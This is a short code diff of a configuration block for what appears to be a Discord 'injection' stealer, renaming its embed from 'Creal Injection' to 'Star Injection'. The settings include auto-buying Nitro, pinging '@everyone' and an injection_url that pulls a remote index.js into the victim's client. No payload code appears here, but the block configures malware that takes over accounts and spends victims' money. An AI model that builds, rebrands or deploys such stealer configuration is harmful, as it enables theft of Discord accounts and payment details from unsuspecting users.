@@ -11,7 +11,7 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone',
-  embed_name: 'Creal Injection', 
+  embed_name: 'Star Injection', 
   embed_icon: 'https://raw.githubusercontent.com/JunkieOpfer/star/main/img/IMG_9927.jpg'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
   injection_url: 'https://raw.githubusercontent.com/JunkieOpfer/star/main/injection/index.js', 
